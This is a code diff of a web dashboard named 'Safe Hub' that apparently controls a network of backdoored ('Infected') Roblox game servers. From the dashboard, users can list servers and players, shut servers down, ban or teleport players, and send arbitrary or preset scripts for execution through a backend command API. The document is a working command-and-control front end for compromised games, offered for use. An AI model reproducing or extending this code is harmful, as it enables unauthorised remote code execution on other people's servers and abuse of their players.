-                const gamePageUrl = server.gamePageUrl || `https://www.roblox.com/games/${server.serverId || ''}`;
-
-                card.innerHTML = `
-                    <div class="card-header">
-                        <div>
-                            <div class="game-name">
-                                ${escapeHtml(server.gameName || 'Unknown Game')}
-                                <span class="infected-tag">Infected</span>
-                            </div>
-                            <div class="server-name">${escapeHtml(server.serverName || 'Unnamed Server')}</div>
-                        </div>
-                        <div>
-                            <span class="status-indicator ${statusClass}">
-                                <span class="status-dot ${statusDot}"></span>
-                                ${statusText}
-                            </span>
-                        </div>
-                    </div>
-                    <div class="details-grid">
-                        <div class="detail-item">
-                            <span class="label">Players</span>
-                            <span class="value">${server.players || 0} <span class="sub">/ ${server.maxPlayers || 50}</span></span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="label">Region</span>
-                            <span class="value">${escapeHtml(server.region || 'Unknown')}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="label">Ping</span>
-                            <span class="value">${server.ping || 0}ms</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="label">Map</span>
-                            <span class="value">${escapeHtml(server.map || 'Unknown')}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="label">Uptime</span>
-                            <span class="value">${server.uptime || '0s'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="label">Server ID</span>
-                            <span class="value" style="font-size:10px;color:#7a879a;font-weight:400;">${escapeHtml(String(server.serverId || '').substring(0, 12))}</span>
-                        </div>
-                    </div>
-                    <div class="player-list">
-                        <div class="title">Players Online</div>
-                        <div class="player-tags">${playerList}</div>
-                    </div>
-                    <div class="card-actions">
-                        <button class="btn btn-success" onclick="selectServer('${server.serverId}')">Select Server</button>
-                        <button class="btn btn-primary" onclick="window.open('${gamePageUrl}', '_blank')">Game Page</button>
-                        <button class="btn btn-warning" onclick="joinServer('${server.serverId}')">Join Server</button>
-                        <button class="btn btn-danger" onclick="shutdownServer('${server.serverId}')">Shutdown</button>
-                    </div>
-                `;
-                
-                grid.appendChild(card);
-            });
-        }
-
-        function renderPlayers(servers) {
-            const grid = document.getElementById('playerGrid');
-            grid.innerHTML = '';
-            
-            let allPlayers = [];
-            servers.forEach(server => {
-                if (server.playerNames && server.playerNames.length > 0) {
-                    server.playerNames.forEach(name => {
-                        allPlayers.push({
-                            name: name,
-                            server: server.gameName || 'Unknown',
-                            serverId: server.serverId
-                        });
-                    });
-                }
-            });
-            
-            if (allPlayers.length === 0) {
-                grid.innerHTML = `
-                    <div class="empty-state">
-                        <div class="icon">👤</div>
-                        <h3>No Players Online</h3>
-                        <p>Players will appear here when they join a server</p>
-                    </div>
-                `;
-                document.getElementById('playerCountLabel').textContent = '0 players';
-                document.getElementById('navPlayerCount').textContent = '0';
-                return;
-            }
-            
-            document.getElementById('playerCountLabel').textContent = `${allPlayers.length} players`;
-            document.getElementById('navPlayerCount').textContent = allPlayers.length;
-            
-            allPlayers.forEach(player => {
-                const card = document.createElement('div');
-                card.className = 'server-card online';
-                card.style.cursor = 'pointer';
-                
-                card.innerHTML = `
-                    <div class="card-header">
-                        <div>
-                            <div class="game-name">
-                                ${escapeHtml(player.name)}
-                            </div>
-                            <div class="server-name">${escapeHtml(player.server)}</div>
-                        </div>
-                        <div>
-                            <span class="status-indicator online">
-                                <span class="status-dot online"></span>
-                                Online
-                            </span>
-                        </div>
-                    </div>
-                    <div class="card-actions">
-                        <button class="btn btn-success" onclick="selectPlayerFromCard('${escapeHtml(player.name)}', '${player.serverId}')">Select Player</button>
-                        <button class="btn btn-primary" onclick="selectServer('${player.serverId}')">View Server</button>
-                    </div>
-                `;
-                
-                grid.appendChild(card);
-            });
-        }
-
-        function updateStats(servers) {
-            let totalPlayers = 0;
-            let onlineServers = 0;
-
-            servers.forEach(server => {
-                if (server.online && !server.isShuttingDown) {
-                    onlineServers++;
-                    totalPlayers += server.players || 0;
-                }
-            });
-
-            document.getElementById('serverCount').textContent = servers.length;
-            document.getElementById('onlineCount').textContent = onlineServers;
-            document.getElementById('playerCount').textContent = totalPlayers;
-        }
-
-        function updateServerSelect(servers) {
-            const select = document.getElementById('serverSelect');
-            const currentValue = select.value;
-            
-            select.innerHTML = '<option value="">Select a server...</option>';
-            
-            servers.forEach(server => {
-                if (server.online && !server.isShuttingDown) {
-                    const option = document.createElement('option');
-                    option.value = server.serverId;
-                    option.textContent = `${server.gameName || 'Unknown'} - ${server.players || 0} players`;
-                    select.appendChild(option);
-                }
-            });
-            
-            if (currentValue && [...select.options].some(opt => opt.value === currentValue)) {
-                select.value = currentValue;
-            }
-            
-            if (select.options.length > 1 && !currentValue) {
-                select.selectedIndex = 1;
-                select.dispatchEvent(new Event('change'));
-            }
-        }
-
-        function updatePlayerSelect(serverId) {
-            const select = document.getElementById('playerSelect');
-            select.innerHTML = '<option value="">Select a player...</option>';
-            select.innerHTML += '<option value="ALL">👥 ALL PLAYERS</option>';
-            
-            const server = serverData.servers.find(s => String(s.serverId) === String(serverId));
-            console.log('[Safe Hub] Updating player select for server:', serverId, 'Found server:', server);
-            
-            if (server && server.playerNames && server.playerNames.length > 0) {
-                server.playerNames.forEach(name => {
-                    const option = document.createElement('option');
-                    option.value = name;
-                    option.textContent = name;
-                    select.appendChild(option);
-                });
-                console.log('[Safe Hub] Added players:', server.playerNames);
-            } else {
-                console.log('[Safe Hub] No players found for server:', serverId);
-            }
-        }
-
-        function selectServer(serverId) {
-            selectedServerId = serverId;
-            document.getElementById('serverSelect').value = serverId;
-            updatePlayerSelect(serverId);
-            switchPage('commands');
-            
-            document.querySelectorAll('.server-card').forEach(card => {
-                card.style.borderColor = card.dataset.serverId === serverId ? '#2d6bff' : '';
-                card.style.borderWidth = card.dataset.serverId === serverId ? '2px' : '';
-            });
-        }
-
-        function selectPlayerFromCard(playerName, serverId) {
-            selectedPlayer = playerName;
-            if (serverId) {
-                selectServer(serverId);
-            }
-            document.getElementById('playerSelect').value = playerName;
-            switchPage('commands');
-            
-            document.querySelectorAll('.player-tag').forEach(tag => {
-                tag.classList.toggle('selected', tag.textContent === playerName);
-            });
-        }
-
-        function clearSelection() {
-            selectedServerId = null;
-            selectedPlayer = null;
-            document.getElementById('serverSelect').value = '';
-            document.getElementById('playerSelect').innerHTML = '<option value="">Select a player...</option><option value="ALL">👥 ALL PLAYERS</option>';
-            document.querySelectorAll('.player-tag').forEach(tag => tag.classList.remove('selected'));
-            document.querySelectorAll('.server-card').forEach(card => {
-                card.style.borderColor = '';
-                card.style.borderWidth = '';
-            });
-        }
-
-        function refreshPlayers() {
-            if (selectedServerId) {
-                updatePlayerSelect(selectedServerId);
-            }
-        }
-
-        function joinServer(serverId) {
-            window.open(`https://www.roblox.com/games/${serverId}`, '_blank');
-        }
-
-        function shutdownServer(serverId) {
-            if (confirm('⚠️ Are you sure you want to shutdown this server?')) {
-                const commandData = {
-                    serverId: serverId,
-                    player: 'SYSTEM',
-                    command: 'shutdown',
-                    extra: '',
-                    reason: 'Server shutdown via dashboard',
-                    timestamp: new Date().toISOString()
-                };
-                sendCommand(commandData);
-            }
-        }
-
-        function executeCommand() {
-            const serverId = document.getElementById('serverSelect').value;
-            const player = document.getElementById('playerSelect').value;
-            const command = document.getElementById('commandInput').value;
-            const extra = document.getElementById('extraInput').value;
-            const reason = document.getElementById('reasonInput').value;
-
-            if (!serverId) {
-                alert('Please select a target server');
-                return;
-            }
-
-            if (!player) {
-                alert('Please select a target player or "ALL"');
-                return;
-            }
-
-            if (!command) {
-                alert('Please select a command');
-                return;
-            }
-
-            // Special handling for message command
-            if (command === 'message' && !extra) {
-                alert('Please enter a message in Additional Parameters');
-                return;
-            }
-
-            // Special handling for teleport command
-            if (command === 'teleport' && !extra) {
-                alert('Please enter coordinates (x,y,z) in Additional Parameters');
-                return;
-            }
-
-            // Special handling for tempban
-            if (command === 'tempban' && !extra) {
-                alert('Please enter duration in minutes in Additional Parameters');
-                return;
-            }
-
-            const commandData = {
-                serverId: serverId,
-                player: player,
-                command: command,
-                extra: extra,
-                reason: reason || 'No reason provided',
-                timestamp: new Date().toISOString()
-            };
-
-            sendCommand(commandData);
-        }
-
-        async function sendCommand(commandData) {
-            try {
-                console.log('[Safe Hub] Sending command:', commandData);
-                
-                const response = await fetch(`${API_URL}/api/command`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(commandData)
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                console.log('[Safe Hub] Command response:', data);
-                
-                const target = commandData.player === 'ALL' ? 'ALL PLAYERS' : commandData.player;
-                alert(`✅ Command "${commandData.command}" sent to ${target} successfully!`);
-            } catch (error) {
-                console.error('[Safe Hub] Command failed:', error);
-                alert(`❌ Command failed: ${error.message}`);
-            }
-
-            document.getElementById('reasonInput').value = '';
-            if (commandData.command !== 'message' && commandData.command !== 'teleport' && commandData.command !== 'tempban') {
-                document.getElementById('extraInput').value = '';
-            }
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        function refreshData() {
-            fetchServers();
-        }
-
-        function switchPage(page) {
-            currentPage = page;
-            
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById('page-' + page).classList.add('active');
-            
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById('nav-' + page).classList.add('active');
-            
-            const titles = {
-                servers: ['Servers', 'Monitor all infected game servers in the network'],
-                players: ['Players', 'View all players currently online across the network'],
-                commands: ['Command Center', 'Execute administrative commands on selected servers and players']
-            };
-            
-            document.getElementById('pageTitle').textContent = titles[page][0];
-            document.getElementById('pageSubtitle').textContent = titles[page][1];
-            
-            if (page === 'players') {
-                renderPlayers(serverData.servers);
-            }
-        }
-
-        // ==================== EVENT LISTENERS ====================
-        document.getElementById('serverSelect').addEventListener('change', function() {
-            if (this.value) {
-                selectedServerId = this.value;
-                updatePlayerSelect(this.value);
-            } else {
-                clearSelection();
-            }
+    function updateServerSelect(servers) {
+      const selects = ['serverSelect', 'execServerSelect', 'execServerSelect2', 'presetServerSelect', 'presetServerSelect2'];
+      selects.forEach(id => {
+        const select = $(id);
+        if (!select) return;
+        const currentVal = select.value;
+        select.innerHTML = '<option value="">Select a server...</option>';
+        servers.forEach(s => {
+          if (s.online && !s.isShuttingDown) {
+            const opt = document.createElement('option');
+            opt.value = s.serverId;
+            opt.textContent = `${s.gameName || 'Unknown'} - ${s.players || 0} players`;
+            select.appendChild(opt);
+          }
         });
+        if (currentVal && [...select.options].some(o => o.value === currentVal)) select.value = currentVal;
+        if (select.options.length > 1 && !currentVal) { select.selectedIndex = 1; select.dispatchEvent(new Event('change')); }
+      });
 
-        document.getElementById('playerSelect').addEventListener('change', function() {
-            selectedPlayer = this.value;
-        });
-
-        // ==================== INITIALIZATION ====================
-        // Check key expiry
-        const keyValid = checkKeyExpiry();
-        if (!keyValid) {
-            document.getElementById('keyExpiryModal').classList.add('active');
+      const pSelects = ['presetPlayerSelect', 'presetPlayerSelect2', 'execPlayerSelect', 'execPlayerSelect2'];
+      pSelects.forEach(id => {
+        const s = $(id);
+        if (s && s.options.length <= 2) {
+          s.innerHTML = '<option value="">Select a player...</option><option value="ALL">ALL PLAYERS</option>';
         }
+      });
+    }
 
-        fetchServers();
-        setInterval(fetchServers, 5000);
+    function updatePlayerSelect(serverId) {
+      const select = $('playerSelect');
+      select.innerHTML = '<option value="">Select a player...</option><option value="ALL">ALL PLAYERS</option>';
+      const server = serverData.servers.find(s => String(s.serverId) === String(serverId));
+      if (server?.playerNames?.length) {
+        server.playerNames.forEach(name => {
+          const opt = document.createElement('option');
+          opt.value = name; opt.textContent = name;
+          select.appendChild(opt);
+        });
+      }
+    }
 
-        console.log('[Safe Hub] Dashboard initialized');
-        console.log('[Safe Hub] Backend URL:', API_URL);
-        console.log('[Safe Hub] Using polling mode (5 second interval)');
-        console.log('[Safe Hub] Key expires in:', KEY_EXPIRY_HOURS, 'hours');
-    </script>
+    function updateExecPlayerSelects(serverId) {
+      ['execPlayerSelect', 'execPlayerSelect2', 'presetPlayerSelect', 'presetPlayerSelect2'].forEach(id => {
+        const select = $(id);
+        if (!select) return;
+        select.innerHTML = '<option value="">Select a player...</option><option value="ALL">ALL PLAYERS</option>';
+        const server = serverData.servers.find(s => String(s.serverId) === String(serverId));
+        if (server?.playerNames?.length) {
+          server.playerNames.forEach(name => {
+            const opt = document.createElement('option');
+            opt.value = name; opt.textContent = name;
+            select.appendChild(opt);
+          });
+        }
+      });
+    }
+
+    // ==================================================
+    // PRESETS RENDER
+    // ==================================================
+    function renderPresets(gridId, serverSelectId, playerSelectId) {
+      const grid = $(gridId);
+      if (!grid) return;
+      grid.innerHTML = '';
+      SCRIPT_PRESETS.forEach(preset => {
+        const card = document.createElement('div');
+        card.className = 'preset-card';
+        card.innerHTML = `
+          <div class="preset-info">
+            <div class="preset-name">${preset.name}</div>
+            <div class="preset-desc">${preset.desc}</div>
+          </div>
+          <span class="preset-tag ${preset.tag}">${preset.tagText}</span>
+          <div class="preset-btns">
+            <button class="btn-sm primary" onclick="loadPreset('${escapeHtml(preset.script)}')">Load</button>
+            <button class="btn-sm danger" onclick="runPreset('${escapeHtml(preset.script)}','${serverSelectId}','${playerSelectId}')">Run</button>
+          </div>`;
+        grid.appendChild(card);
+      });
+    }
+
+    function loadPreset(script) {
+      const ta = $('scriptInput') || $('scriptInput2');
+      if (ta) ta.value = script;
+      switchExecutorTab('custom', document.querySelector('.executor-tab'));
+    }
+
+    function runPreset(script, serverSelectId, playerSelectId) {
+      const serverId = $(serverSelectId)?.value;
+      const player = $(playerSelectId)?.value;
+      if (!serverId) return alert('Select a target server first');
+      const playerName = player || linkedRobloxUser || 'username';
+      const finalScript = script.replace(/username/g, playerName).replace(/usernamehere/g, playerName).replace(/urusernamehere/g, playerName);
+      sendScriptCommand(serverId, player, finalScript);
+    }
+
+    // ==================================================
+    // EXECUTOR
+    // ==================================================
+    function switchExecutorTab(tab, btn) {
+      $('executorCustom').style.display = tab === 'custom' ? 'block' : 'none';
+      $('executorPresets').style.display = tab === 'presets' ? 'block' : 'none';
+      document.querySelectorAll('.executor-tab').forEach(t => t.classList.remove('active'));
+      if (btn) btn.classList.add('active');
+      if (tab === 'presets') {
+        renderPresets('presetGrid', 'presetServerSelect', 'presetPlayerSelect');
+      }
+    }
+
+    function getPlayerName(selectId) {
+      const select = $(selectId);
+      const player = select ? select.value : '';
+      if (!player || player === 'ALL') return linkedRobloxUser || 'username';
+      return player;
+    }
+
+    function executeScript() {
+      const serverId = $('execServerSelect').value;
+      const player = $('execPlayerSelect').value;
+      let script = $('scriptInput').value.trim();
+      if (!serverId) return alert('Select a target server');
+      if (!script) return alert('Enter a script to execute');
+      const playerName = player || linkedRobloxUser || 'username';
+      script = script.replace(/username/g, playerName).replace(/usernamehere/g, playerName).replace(/urusernamehere/g, playerName);
+      sendScriptCommand(serverId, player, script);
+    }
+
+    function executeScript2() {
+      const serverId = $('execServerSelect2').value;
+      const player = $('execPlayerSelect2').value;
+      let script = $('scriptInput2').value.trim();
+      if (!serverId) return alert('Select a target server');
+      if (!script) return alert('Enter a script to execute');
+      const playerName = player || linkedRobloxUser || 'username';
+      script = script.replace(/username/g, playerName).replace(/usernamehere/g, playerName).replace(/urusernamehere/g, playerName);
+      sendScriptCommand(serverId, player, script);
+    }
+
+    function clearScript() { $('scriptInput').value = ''; }
+    function copyScript() { if (navigator.clipboard) navigator.clipboard.writeText($('scriptInput').value); }
+
+    async function sendScriptCommand(serverId, player, script) {
+      try {
+        const response = await fetch(`${API_URL}/api/command`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ serverId, player: player || 'ALL', command: 'script', extra: script, reason: 'Executed via SafeHub', timestamp: new Date().toISOString() })
+        });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        alert('⚡ Script sent to server successfully!');
+      } catch (error) {
+        alert(`Script failed: ${error.message}`);
+      }
+    }
+
+    // Bind server select → player select for executor
+    ['execServerSelect', 'execServerSelect2', 'presetServerSelect', 'presetServerSelect2'].forEach(id => {
+      document.addEventListener('change', (e) => {
+        if (e.target.id === id && e.target.value) {
+          updateExecPlayerSelects(e.target.value);
+        }
+      });
+    });
+
+    // ==================================================
+    // INTERACTIONS
+    // ==================================================
+    function selectServer(id) {
+      selectedServerId = id;
+      $('serverSelect').value = id;
+      updatePlayerSelect(id);
+      switchPage('commands');
+      document.querySelectorAll('.server-card').forEach(c => {
+        c.style.borderColor = c.dataset.serverId === id ? 'var(--accent)' : '';
+        c.style.borderWidth = c.dataset.serverId === id ? '2px' : '';
+      });
+    }
+
+    function selectPlayerFromCard(name, serverId) {
+      selectedPlayer = name;
+      if (serverId) selectServer(serverId);
+      $('playerSelect').value = name;
+      switchPage('commands');
+      document.querySelectorAll('.player-tag').forEach(t =>
+        t.classList.toggle('selected', t.textContent === name));
+    }
+
+    function clearSelection() {
+      selectedServerId = null;
+      selectedPlayer = null;
+      $('serverSelect').value = '';
+      $('playerSelect').innerHTML = '<option value="">Select a player...</option><option value="ALL">ALL PLAYERS</option>';
+      document.querySelectorAll('.player-tag').forEach(t => t.classList.remove('selected'));
+      document.querySelectorAll('.server-card').forEach(c => { c.style.borderColor = ''; c.style.borderWidth = ''; });
+    }
+
+    function refreshPlayers() { if (selectedServerId) updatePlayerSelect(selectedServerId); }
+    function joinServer(id) { window.open(`https://www.roblox.com/games/${id}`, '_blank'); }
+
+    function shutdownServer(id) {
+      if (confirm('Are you sure you want to shutdown this server?')) {
+        sendCommand({ serverId: id, player: 'SYSTEM', command: 'shutdown', extra: '', reason: 'Server shutdown via dashboard' });
+      }
+    }
+
+    // ==================================================
+    // COMMANDS
+    // ==================================================
+    function executeCommand() {
+      const serverId = $('serverSelect').value;
+      const player = $('playerSelect').value;
+      const command = $('commandInput').value;
+      const extra = $('extraInput').value;
+      const reason = $('reasonInput').value;
+      if (!serverId) return alert('Select a target server');
+      if (!player) return alert('Select a target player or "ALL"');
+      if (!command) return alert('Select a command');
+      if ((command === 'message' || command === 'teleport' || command === 'tempban') && !extra) return alert('Please fill in Additional Parameters for this command');
+      sendCommand({ serverId, player, command, extra, reason: reason || 'No reason provided' });
+    }
+
+    async function sendCommand(data) {
+      try {
+        const response = await fetch(`${API_URL}/api/command`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
+        });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        await response.json();
+        alert(`Command "${data.command}" sent to ${data.player === 'ALL' ? 'ALL PLAYERS' : data.player} successfully!`);
+      } catch (error) {
+        alert(`Command failed: ${error.message}`);
+      }
+      $('reasonInput').value = '';
+      if (!['message','teleport','tempban'].includes(data.command)) $('extraInput').value = '';
+    }
+
+    // ==================================================
+    // PAGE SWITCHING
+    // ==================================================
+    function switchPage(page) {
+      currentPage = page;
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      const pageEl = $(`page-${page}`);
+      if (pageEl) pageEl.classList.add('active');
+      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      const navEl = $(`nav-${page}`);
+      if (navEl) navEl.classList.add('active');
+      if (page === 'players') renderPlayers(serverData.servers);
+      if (page === 'executor') {
+        renderPresets('presetGrid2', 'presetServerSelect2', 'presetPlayerSelect2');
+      }
+    }
+
+    // ==================================================
+    // UTILITY
+    // ==================================================
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    function refreshData() { fetchServers(); }
+
+    // ==================================================
+    // SETTINGS
+    // ==================================================
+    function loadSettings() {
+      const settings = JSON.parse(localStorage.getItem('safehub_settings') || '{}');
+      if (settings.theme) updateTheme(settings.theme, false);
+      if (settings.accent) updateAccentColor(settings.accent.primary, settings.accent.secondary, null, false);
+      if (settings.background) updateBackground(settings.background, false);
+      if (settings.width) updateWidth(settings.width, false);
+      if (settings.density) updateDensity(settings.density, false);
+      if (settings.glass !== undefined) updateGlass(settings.glass, false);
+      if (settings.animations !== undefined) updateAnimations(settings.animations, false);
+    }
+
+    function saveSettings() {
+      const settings = {
+        theme: $('themeSelect')?.value || 'dark',
+        accent: currentAccent,
+        background: $('bgSelect')?.value || 'ambient',
+        width: $('widthSelect')?.value || 'default',
+        density: $('densitySelect')?.value || 'comfortable',
+        glass: $('glassToggle')?.checked ?? true,
+        animations: $('animToggle')?.checked ?? true
+      };
+      localStorage.setItem('safehub_settings', JSON.stringify(settings));
+    }
+
+    function updateTheme(theme, save = true) {
+      document.body.setAttribute('data-theme', theme);
+      const sel = $('themeSelect'); if (sel) sel.value = theme;
+      const themes = {
+        dark: { bg: '#020617', surface: '#0b1221', text: '#f1f5f9' },
+        light: { bg: '#f8fafc', surface: '#ffffff', text: '#0f172a' },
+        midnight: { bg: '#0f0720', surface: '#1a103c', text: '#e2e8f0' },
+        forest: { bg: '#022c22', surface: '#064e3b', text: '#ecfdf5' },
+        ocean: { bg: '#0c1e3e', surface: '#132f5c', text: '#e0f2fe' },
+        crimson: { bg: '#1a0505', surface: '#2d0a0a', text: '#fef2f2' }
+      };
+      const t = themes[theme] || themes.dark;
+      document.documentElement.style.setProperty('--bg', t.bg);
+      document.documentElement.style.setProperty('--surface', t.surface);
+      document.documentElement.style.setProperty('--text', t.text);
+      if (save) saveSettings();
+    }
+
+    function updateAccentColor(primary, secondary, event, save = true) {
+      currentAccent = { primary, secondary };
+      document.documentElement.style.setProperty('--accent', primary);
+      let style = document.getElementById('dynamic-accent-style');
+      if (!style) { style = document.createElement('style'); style.id = 'dynamic-accent-style'; document.head.appendChild(style); }
+      style.textContent = `
+        .btn-sm.primary, .btn-hero-primary { background: linear-gradient(135deg, ${secondary}, ${primary}) !important; }
+        .login-box .btn-primary { background: linear-gradient(135deg, ${secondary}, ${primary}) !important; }
+        .player-tag.selected { background: linear-gradient(135deg, ${secondary}, ${primary}) !important; }
+        .nav-item.active::before { background: ${primary} !important; box-shadow: 0 0 12px ${primary}66 !important; }
+        .nav-item.active { color: ${primary} !important; }
+        .toggle-label input:checked + .toggle-slider { background: ${primary} !important; border-color: ${primary} !important; }
+      `;
+      document.querySelectorAll('.color-btn').forEach(btn => btn.classList.remove('active'));
+      if (event?.target) event.target.classList.add('active');
+      if (save) saveSettings();
+    }
+
+    function updateBackground(type, save = true) {
+      const sel = $('bgSelect'); if (sel) sel.value = type;
+      const glow = document.querySelector('.ambient-glow');
+      if (!glow) return;
+      if (type === 'ambient') { glow.style.display = 'block'; glow.style.background = ''; }
+      else if (type === 'minimal') { glow.style.display = 'block'; glow.style.background = 'radial-gradient(ellipse at 50% 0%, rgba(56,189,248,0.06), transparent 70%)'; }
+      else { glow.style.display = 'none'; }
+      if (save) saveSettings();
+    }
+
+    function updateWidth(mode, save = true) {
+      const sel = $('widthSelect'); if (sel) sel.value = mode;
+      const main = document.querySelector('.main-content');
+      if (!main) return;
+      if (mode === 'wide') main.style.maxWidth = '1920px';
+      else if (mode === 'compact') main.style.maxWidth = '1200px';
+      else main.style.maxWidth = '1600px';
+      if (save) saveSettings();
+    }
+
+    function updateDensity(mode, save = true) {
+      const sel = $('densitySelect'); if (sel) sel.value = mode;
+      document.body.classList.toggle('compact-mode', mode === 'compact');
+      if (save) saveSettings();
+    }
+
+    function updateGlass(enabled, save = true) {
+      const t = $('glassToggle'); if (t) t.checked = enabled;
+      document.body.classList.toggle('no-glass', !enabled);
+      if (save) saveSettings();
+    }
+
+    function updateAnimations(enabled, save = true) {
+      const t = $('animToggle'); if (t) t.checked = enabled;
+      document.body.classList.toggle('no-animations', !enabled);
+      if (save) saveSettings();
+    }
+
+    // ==================================================
+    // INIT
+    // ==================================================
+    function initializeDashboard() {
+      checkKeyExpiry();
+      fetchServers();
+      setInterval(fetchServers, 5000);
+      updateUserCard();
+      loadSettings();
+      renderPresets('presetGrid', 'presetServerSelect', 'presetPlayerSelect');
+      renderPresets('presetGrid2', 'presetServerSelect2', 'presetPlayerSelect2');
+
+      $('serverSelect').addEventListener('change', function() {
+        if (this.value) { selectedServerId = this.value; updatePlayerSelect(this.value); }
+        else clearSelection();
+      });
+      $('playerSelect').addEventListener('change', function() { selectedPlayer = this.value; });
+
+      console.log('[Safe Hub] Dashboard initialized — API:', API_URL);
+    }
+
+    // ==================================================
+    // AUTO LOGIN
+    // ==================================================
+    window.onload = function() {
+      const savedKey = localStorage.getItem('safehub_key');
+      const savedValidated = localStorage.getItem('safehub_validated');
+      if (savedKey && savedValidated === 'true') {
+        $('keyInput').value = savedKey;
+        $('landingPage').style.display = 'none';
+        $('dashboard').classList.add('active');
+        validated = true;
+        initializeDashboard();
+      }
+    };
+  </script>
 </body>
 </html>
